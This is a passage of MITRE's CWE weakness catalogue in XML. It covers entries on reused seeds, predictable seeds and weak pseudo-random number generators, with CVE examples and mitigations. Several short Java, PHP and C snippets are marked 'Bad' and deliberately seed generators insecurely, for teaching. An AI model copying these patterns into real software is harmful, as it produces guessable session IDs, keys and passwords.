         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Other</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Other</Impact>
               <Note>If a PRNG is used incorrectly, such as using the same seed for each initialization or using a predictable seed, then an attacker may be able to easily guess the seed and thus the random numbers. This could lead to unauthorized access to a system if the seed is used for authentication and authorization.</Note>
            </Consequence>
         </Common_Consequences>
		 <Observed_Examples>
			<Observed_Example>
				<Reference>CVE-2020-7010</Reference>
				<Description>Cloud application on Kubernetes generates passwords using a weak random number generator based on deployment time.</Description>
				<Link>https://www.cve.org/CVERecord?id=CVE-2020-7010</Link>
			 </Observed_Example>
		   <Observed_Example>
			 <Reference>CVE-2019-11495</Reference>
			 <Description>server uses erlang:now() to seed the PRNG, which
			 results in a small search space for potential random
			 seeds</Description>
			 <Link>https://www.cve.org/CVERecord?id=CVE-2019-11495</Link>
		   </Observed_Example>
		   <Observed_Example>
			 <Reference>CVE-2018-12520</Reference>
			 <Description>Product's PRNG is not seeded for the generation of session IDs</Description>
			 <Link>https://www.cve.org/CVERecord?id=CVE-2018-12520</Link>
		   </Observed_Example>
		   <Observed_Example>
			 <Reference>CVE-2016-10180</Reference>
			 <Description>Router's PIN generation is based on rand(time(0)) seeding.</Description>
			 <Link>https://www.cve.org/CVERecord?id=CVE-2016-10180</Link>
		   </Observed_Example>
		 </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>PRNG Seed Error</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 20: Weak Random Numbers.&#34; Page 299"/>
         </References>
	 <Notes>
	   <Note Type="Maintenance">As of CWE 4.5, terminology related to randomness, entropy, and
	   predictability can vary widely. Within the developer and other
	   communities, "randomness" is used heavily. However, within
	   cryptography, "entropy" is distinct, typically implied as a
	   measurement. There are no commonly-used definitions, even within
	   standards documents and cryptography papers. Future versions of
	   CWE will attempt to define these terms and, if necessary,
	   distinguish between them in ways that are appropriate for
	   different communities but do not reduce the usability of CWE for
	   mapping, understanding, or other scenarios.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Description, Modes_of_Introduction, Name, Relationships, Type</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Description, Maintenance_Notes, Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2017-11-08">PRNG Seed Error</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="336" Name="Same Seed in Pseudo-Random Number Generator (PRNG)" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>A Pseudo-Random Number Generator (PRNG) uses the same seed each time the product is initialized.</Description>
         <Extended_Description>Given the deterministic nature of PRNGs, using the same seed for each initialization will lead to the same output in the same order. If an attacker can guess (or knows) the seed, then the attacker may be able to determine the random numbers that will be produced from the PRNG.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="335" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
			   <Note>The developer might not consider the need to use new seeds during design.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Other</Scope>
               <Scope>Access Control</Scope>
               <Impact>Other</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Do not reuse PRNG seeds. Consider a PRNG that periodically re-seeds itself as needed from a high quality pseudo-random output, such as hardware devices.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-2">
               <Phase>Architecture and Design</Phase>
               <Phase>Requirements</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>Use products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems, or use the more recent FIPS 140-3 [REF-1192] if possible.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code uses a statistical PRNG to generate account IDs.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>private static final long SEED = 1234567890;<xhtml:br/>public int generateAccountID() {<xhtml:div style="margin-left:1em;">Random random = new Random(SEED);<xhtml:br/>return random.nextInt();</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Because the program uses the same seed value for every invocation of the PRNG, its values are predictable, making the system vulnerable to attack.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-45">
               <Intro_Text>This code attempts to generate a unique random identifier for a user's session.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>function generateSessionID($userID){<xhtml:div style="margin-left:1em;">srand($userID);<xhtml:br/>return rand();</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Because the seed for the PRNG is always the user's ID, the session ID will always be the same. An attacker could thus predict any user's session ID and potentially hijack the session.</Body_Text>
               <Body_Text>If the user IDs are generated sequentially, or otherwise restricted to a narrow range of values, then this example also exhibits a Small Seed Space (CWE-339).</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Same Seed in PRNG</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>MSC02-J</Entry_ID>
               <Entry_Name>Generate strong random numbers</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-267" Section="Annex C, Approved Random Number Generators"/>
            <Reference External_Reference_ID="REF-1192"/>
         </References>
	 <Notes>
	   <Note Type="Maintenance">As of CWE 4.5, terminology related to randomness, entropy, and
	   predictability can vary widely. Within the developer and other
	   communities, "randomness" is used heavily. However, within
	   cryptography, "entropy" is distinct, typically implied as a
	   measurement. There are no commonly-used definitions, even within
	   standards documents and cryptography papers. Future versions of
	   CWE will attempt to define these terms and, if necessary,
	   distinguish between them in ways that are appropriate for
	   different communities but do not reduce the usability of CWE for
	   mapping, understanding, or other scenarios.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Description, Modes_of_Introduction, Name, References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Description, Maintenance_Notes, Modes_of_Introduction, Potential_Mitigations, References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2017-11-08">Same Seed in PRNG</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="337" Name="Predictable Seed in Pseudo-Random Number Generator (PRNG)" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>A Pseudo-Random Number Generator (PRNG) is initialized from a predictable seed, such as the process ID or system time.</Description>
         <Extended_Description>The use of predictable seeds significantly reduces the number of possible seeds that an attacker would need to test in order to predict which random numbers will be generated by the PRNG.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="335" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Varies by Context</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Description>Use non-predictable inputs for seed generation.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-2">
               <Phase>Architecture and Design</Phase>
               <Phase>Requirements</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>Use products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems, or use the more recent FIPS 140-3 [REF-1192] if possible.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-50">
               <Phase>Implementation</Phase>
               <Description>Use a PRNG that periodically re-seeds itself using input from high-quality sources, such as hardware devices with high entropy. However, do not re-seed too frequently, or else the entropy source might block.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-102">
               <Intro_Text>Both of these examples use a statistical PRNG seeded with the current value of the system clock to generate a random number:</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>Random random = new Random(System.currentTimeMillis());<xhtml:br/>int accountID = random.nextInt();</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>srand(time());<xhtml:br/>int randNum = rand();</xhtml:div>
               </Example_Code>
               <Body_Text>An attacker can easily predict the seed used by these PRNGs, and so also predict the stream of random numbers generated. Note these examples also exhibit CWE-338 (Use of Cryptographically Weak PRNG).</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
		 <Observed_Examples>
         <Observed_Example>
            <Reference>CVE-2020-7010</Reference>
            <Description>Cloud application on Kubernetes generates passwords using a weak random number generator based on deployment time.</Description>
            <Link>https://www.cve.org/CVERecord?id=CVE-2020-7010</Link>
         </Observed_Example>
		   <Observed_Example>
			 <Reference>CVE-2019-11495</Reference>
			 <Description>server uses erlang:now() to seed the PRNG, which
			 results in a small search space for potential random
			 seeds</Description>
			 <Link>https://www.cve.org/CVERecord?id=CVE-2019-11495</Link>
		   </Observed_Example>
		   <Observed_Example>
			 <Reference>CVE-2008-0166</Reference>
			 <Description>The removal of a couple lines of code caused Debian's OpenSSL Package to only use the current process ID for seeding a PRNG</Description>
			 <Link>https://www.cve.org/CVERecord?id=CVE-2008-0166</Link>
		   </Observed_Example>
		   <Observed_Example>
			 <Reference>CVE-2016-10180</Reference>
			 <Description>Router's PIN generation is based on rand(time(0)) seeding.</Description>
			 <Link>https://www.cve.org/CVERecord?id=CVE-2016-10180</Link>
		   </Observed_Example>
		   <Observed_Example>
			 <Reference>CVE-2018-9057</Reference>
			 <Description>cloud provider product uses a non-cryptographically secure PRNG and seeds it with the current time</Description>
			 <Link>https://www.cve.org/CVERecord?id=CVE-2018-9057</Link>
		   </Observed_Example>
		 </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Predictable Seed in PRNG</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>MSC02-J</Entry_ID>
               <Entry_Name>Generate strong random numbers</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-267" Section="Annex C, Approved Random Number Generators"/>
            <Reference External_Reference_ID="REF-1192"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 20: Weak Random Numbers.&#34; Page 299"/>
         </References>
	 <Notes>
	   <Note Type="Maintenance">As of CWE 4.5, terminology related to randomness, entropy, and
	   predictability can vary widely. Within the developer and other
	   communities, "randomness" is used heavily. However, within
	   cryptography, "entropy" is distinct, typically implied as a
	   measurement. There are no commonly-used definitions, even within
	   standards documents and cryptography papers. Future versions of
	   CWE will attempt to define these terms and, if necessary,
	   distinguish between them in ways that are appropriate for
	   different communities but do not reduce the usability of CWE for
	   mapping, understanding, or other scenarios.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Modes_of_Introduction, Name, References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Description, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes, Observed_Examples, Potential_Mitigations, References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2017-11-08">Predictable Seed in PRNG</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="338" Name="Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product uses a Pseudo-Random Number Generator (PRNG) in a security context, but the PRNG's algorithm is not cryptographically strong.</Description>
         <Extended_Description>
            <xhtml:p>When a non-cryptographic PRNG is used in a cryptographic context, it can expose the cryptography to certain types of attacks.</xhtml:p>
            <xhtml:p>Often a pseudo-random number generator (PRNG) is not designed for cryptography. Sometimes a mediocre source of randomness is sufficient or preferable for algorithms that use random numbers. Weak generators generally take less processing power and/or do not use the precious, finite, entropy sources on a system. While such PRNGs might have very useful features, these same features could be used to break the cryptography.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="330" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="330" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>If a PRNG is used for authentication and authorization, such as a session ID or a seed for generating a cryptographic key, then an attacker may be able to easily guess the ID or cryptographic key and gain access to restricted functionality.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Use functions or hardware which use a hardware-based random number generation for all crypto. This is the recommended solution. Use CyptGenRandom on Windows, or hw_rand() on Linux.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-102">
               <Intro_Text>Both of these examples use a statistical PRNG seeded with the current value of the system clock to generate a random number:</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>Random random = new Random(System.currentTimeMillis());<xhtml:br/>int accountID = random.nextInt();</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>srand(time());<xhtml:br/>int randNum = rand();</xhtml:div>
               </Example_Code>
               <Body_Text>The random number functions used in these examples, rand() and Random.nextInt(), are not considered cryptographically strong. An attacker may be able to predict the random numbers generated by these functions. Note that these example also exhibit CWE-337 (Predictable Seed in PRNG).</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2009-3278</Reference>
               <Description>Crypto product uses rand() library function to generate a recovery key, making it easier to conduct brute force attacks.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3278</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3238</Reference>
               <Description>Random number generator can repeatedly generate the same value.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3238</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2367</Reference>
               <Description>Web application generates predictable session IDs, allowing session hijacking.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2367</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0166</Reference>
               <Description>SSL library uses a weak random number generator that only generates 65,536 unique keys.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-0166</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Non-cryptographic PRNG</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>MSC30-C</Entry_ID>
               <Entry_Name>Do not use the rand() function for generating pseudorandom numbers</Entry_Name>
               <Mapping_Fit>CWE More Abstract</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-18"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 20: Weak Random Numbers.&#34; Page 299"/>
         </References>
	 <Notes>
	   <Note Type="Maintenance">As of CWE 4.5, terminology related to randomness, entropy, and
	   predictability can vary widely. Within the developer and other
	   communities, "randomness" is used heavily. However, within
	   cryptography, "entropy" is distinct, typically implied as a
	   measurement. There are no commonly-used definitions, even within
	   standards documents and cryptography papers. Future versions of
	   CWE will attempt to define these terms and, if necessary,
	   distinguish between them in ways that are appropriate for
	   different communities but do not reduce the usability of CWE for
	   mapping, understanding, or other scenarios.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CLASP</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Observed_Examples, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Description, Name, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
